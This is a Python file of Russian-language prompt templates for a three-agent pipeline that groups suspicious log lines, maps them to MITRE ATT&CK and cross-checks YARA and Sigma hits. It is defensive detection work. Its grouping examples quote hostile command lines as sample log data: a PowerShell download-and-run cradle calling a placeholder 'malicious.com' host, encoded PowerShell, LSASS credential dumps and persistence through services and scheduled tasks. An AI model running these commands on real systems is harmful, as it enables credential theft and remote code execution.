"""Prompts for log analysis agents."""

# БЛОК ВАЖНО: - HTTP методы DELETE, PUT, PATCH — это шум, не группируй их как атаку. (для синтетики)

PRIMARY_ANALYSIS_USER_PROMPT_V2 = """Проанализируй следующий лог-файл на предмет подозрительной активности. Выводи результат ТОЛЬКО на русском языке.

ЛОГ-ФАЙЛ:
```
{log_content}
```

ЗАДАЧА:
1. Выяви все подозрительные активности, ошибки и аномалии
2. Определи временные рамки событий (timestamp)
3. Извлеки конкретные строки логов, указывающие на проблемы
4. СГРУППИРУЙ связанные события по сырым строкам логов
5. Опиши что произошло в каждом случае
6. Определи ВЗАИМОСВЯЗИ между событиями

ВАЖНО: ГРУППИРОВКА СОБЫТИЙ
- Группируй события по возможной связи: пользователь, IP, паттерн атаки, сервис, назначение, путь запроса и т.д.
- НЕ группируй по HTTP статусам (200, 404, 500, 502, 503, 504) — это шум, а не атака.
- НЕ группируй по timestamp (ЗАПРЕЩЕНО).
- Если единственная общая черта у строк — HTTP статус 5xx — не создавай группу. Это легитимные ошибки.
- Одна строка лога МОЖЕТ быть в нескольких группах, если она может относиться к разным активностям.
- Если строка подозрительная, но не связана с другими — создай группу из одного элемента.

ПРИМЕРЫ ПРАВИЛЬНОЙ ГРУППИРОВКИ:

❌ ПЛОХО (группировка по HTTP статусу):
  - "... 500 ..." (любой IP)
  - "... 500 ..." (другой IP)
  → НЕ создавай группу для ошибок 500
  
❌ ПЛОХО (смешивание разных типов атак в одной группе):
  - "89.23.74.19 - - [10/Jan/2026:13:06:06] \"POST /login HTTP/1.1\" 401" (брутфорс)
  - "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0AT..." (выполнение команд)
  - "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 lsass.dmp" (дамп LSASS)
  → Это три РАЗНЫЕ атаки, их НЕЛЬЗЯ в одну группу. Создай отдельные группы для каждого типа.

✅ ХОРОШО (группировка по IP и паттерну):
  - "89.23.74.19 - - [10/Jan/2026:13:06:06] \"POST /login HTTP/1.1\" 401"
  - "89.23.74.19 - - [10/Jan/2026:13:06:10] \"POST /login HTTP/1.1\" 401"
  - "89.23.74.19 - - [10/Jan/2026:13:06:15] \"POST /login HTTP/1.1\" 200"
  → Группа: брутфорс с IP 89.23.74.19

✅ ХОРОШО (группировка по ошибке загрузки библиотеки):
  - "ERROR: ld.so: object '/usr/local/lib/libprocesshider.so' cannot be preloaded"
  - "ERROR: ld.so: object '/usr/local/lib/libprocesshider.so' cannot be preloaded (другая строка)"
  → Группа: попытка инжекции через LD_PRELOAD

✅ ХОРОШО (группировка по командам PowerShell):
  - "powershell -ExecutionPolicy Bypass -File C:\\Users\\admin\\payload.ps1"
  - "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0AT..."
  - "powershell IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"
  → Группа: выполнение PowerShell с обфускацией/скачиванием скрипта

✅ ХОРОШО (группировка по созданию служб):
  - "sc.exe create UpdateService binPath= C:\\Windows\\Temp\\update.exe start= auto"
  - "sc.exe start UpdateService"
  - "New-Service -Name UpdateService -BinaryPathName C:\\Windows\\Temp\\update.exe"
  → Группа: создание и запуск подозрительной службы для персистенции

✅ ХОРОШО (группировка по планировщику задач):
  - "schtasks /create /tn 'UpdateTask' /tr C:\\Windows\\Temp\\update.exe /sc daily /st 09:00"
  - "schtasks /run /tn 'UpdateTask'"
  → Группа: создание задачи в планировщике для персистенции

✅ ХОРОШО (группировка по дампу LSASS):
  - "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 lsass.dmp full"
  - "procdump.exe -ma lsass.exe lsass.dmp"
  - "C:\\Windows\\System32\\Taskmgr.exe /dump 1234 lsass.dmp"
  → Группа: попытка дампа LSASS для кражи учётных данных
  
⚠️ КОНТЕКСТНАЯ ОЦЕНКА (не игнорируй, а анализируй):
  - "sudo -u admin ./deploy.sh" → если пользователь admin не должен использовать sudo → подозрительно
  - "systemctl restart nginx" → если это не плановое обслуживание → может быть частью атаки
  - "docker exec -it container bash" → если контейнер не должен иметь интерактивный доступ → подозрительно
  
  ПРАВИЛО: Оценивай команду в контексте:
  1. Кто выполняет (обычный пользователь или сервисный аккаунт)
  2. Когда (рабочее время или 3 часа ночи)
  3. Откуда (ожидаемый IP или неожиданный)
  4. Что делает (соответствует ли обычной работе пользователя)
  
ФОРМАТ ОТВЕТА (СТРОГО):

СНАЧАЛА выведи секцию ---GROUPS--- с JSON-массивом групп событий. Каждая группа содержит сырые строки логов (log_lines), а не описания событий:

---GROUPS---
[
  {{
    "group_id": "g1",
    "log_lines": [
      "[Wed Dec 17 13:06:06 2025] [error] [client 89.23.74.19] Authentication failed for user admin from 192.168.1.100",
      "[Wed Dec 17 13:06:10 2025] [error] [client 89.23.74.19] Possible brute force attack from 89.23.74.19"
    ],
    "first_seen": "2025-12-17 13:06:06",
    "last_seen": "2025-12-17 13:06:10"
  }},
  {{
    "group_id": "g2",
    "log_lines": [...],
    "first_seen": "...",
    "last_seen": "..."
  }}
]
---GROUPS---

ЗАТЕМ выведи:

## Первичный анализ

[Полный структурированный анализ всех событий и их взаимосвязей]

## Краткое резюме

[2-3 предложения, суммирующие ситуацию]

ВАЖНО:
- Секция ---GROUPS--- должна идти ПЕРВОЙ в ответе, затем анализ.
- Если сомневаешься — лучше создай группу, чем пропусти подозрительную активность.
- Если строка может принадлежать нескольким группам — включи её во все релевантные группы.
- В log_lines указывай ТОЛЬКО оригинальные строки из лог-файла, без изменений."""

# =============================================================================
# Агент 2: Промпт для финального отчёта
# =============================================================================

FINAL_REPORT_USER_PROMPT = """На основе первичного анализа логов и данных из MITRE ATT&CK сформируй итоговый отчёт.

ПЕРВИЧНЫЙ АНАЛИЗ:
{primary_analysis}

МИНИ-ОТЧЕТ ОТ АГЕНТА 1:
{mini_report}

НАЙДЕННЫЕ MITRE ТЕХНИКИ (для каждого события):
{mitre_techniques_str}

ЗАДАЧА:
1. Определи тип угрозы (threat_type_id: 1-11)
2. Оцени уровень серьёзности (severity_level_id: 1-4)
3. Сопоставь обнаруженные активности с техниками MITRE ATT&CK
4. Сформируй подробный отчёт
5. Дай практические рекомендации по устранению

ФОРМАТ ОТВЕТА:
## Отчёт об инциденте безопасности

### Описание инцидента
Подробное описание того что произошло.

### Сопоставление с MITRE ATT&CK
- **Тактика**: [название]
- **Техники**: [ID и название]
- **Линия защиты**: [1/2/3]

### Уровень серьёзности
[Обоснование выбора severity]

### Тип угрозы
[Обоснование выбора threat_type]

### Рекомендации
- [Конкретные шаги по устранению]
- [Меры по предотвращению]

---META---
severity_level_id: <число 1-4>
threat_type_id: <число 1-11>
mitre_techniques: ["<ID техники>", ...]
---END---"""

# =============================================================================
# Агент 3: Промпт для финальной суммаризации
# =============================================================================

SUMMARIZER_USER_PROMPT = """Объедини все результаты проверок в единый отчёт.

=== ВНИМАНИЕ ===
Часть событий от Agent 1 могут быть ложными срабатываниями (галлюцинации).
Проверь каждое событие:
- [YES] Есть в YARA/Sigma/MITRE? -> подтверждено -> включай в отчёт
- [NO] Нет нигде? -> НЕПОДТВЕРЖДЕНО -> вынеси в блок "требует проверки"

=== ПЕРВИЧНЫЙ АНАЛИЗ (Agent 1) ===
Событий обнаружено: {events_found}

{mini_report}

{primary_analysis}

=== MITRE ATT&CK (Agent 2 - через RAG) ===
{mitre_context}

=== ОТЧЕТ AI (Agent 2) ===
Оценка серьёзности: {severity_level_id}/4
Тип угрозы: {threat_type_id}/11
Техники MITRE: {mitre_techniques_str}

{agent2_report}

=== YARA SCAN ===
Совпадений: {yara_count}
{yara_context}

=== SIGMA SCAN ===
Совпадений: {sigma_count}
{sigma_context}

ЗАДАЧА:
1. Опиши инцидент, объединяя все источники
2. Покажи как YARA/Sigma совпадения подтверждают выводы AI
3. Сопоставь с техниками MITRE ATT&CK
4. Дай рекомендации по устранению и предотвращению
5. Сохрани/обоснуй оценку серьёзности и типа угрозы
6. НЕПОДТВЕРЖДЕННЫЕ события вынеси в отдельный блок (не влияют на severity!)

ФОРМАТ ОТВЕТА:
## Отчёт об инциденте безопасности

### Описание инцидента
Подробное описание того что произошло.

### Результаты проверки YARA
Результаты совпадений с YARA-правилами.

### Результаты проверки Sigma
Результаты совпадений с Sigma-правилами.

### Сопоставление с MITRE ATT&CK
- **Тактика**: [название]
- **Техники**: [ID и название]

### Уровень серьёзности
[Обоснование]

### Тип угрозы
[Обоснование]

### Рекомендации
- [Конкретные шаги по устранению]
- [Меры по предотвращению]

### ❗ События, требующие ручной проверки❗

[краткое описание события] (timestamp: ...)
[оригинальная строка из лога]
ВНИМАНИЕ: Это могут быть ложные срабатывания Agent 1

---META---
severity_level_id: <число 1-4>
threat_type_id: <число 1-11>
mitre_techniques: ["<ID техники>", ...]
yara_rules: ["<имя правила>", ...]
sigma_rules: ["<имя правила>", ...]
events_found: <число>
confidence_level: "high" | "medium" | "low"
unconfirmed_events_count: <число>
---END---"""
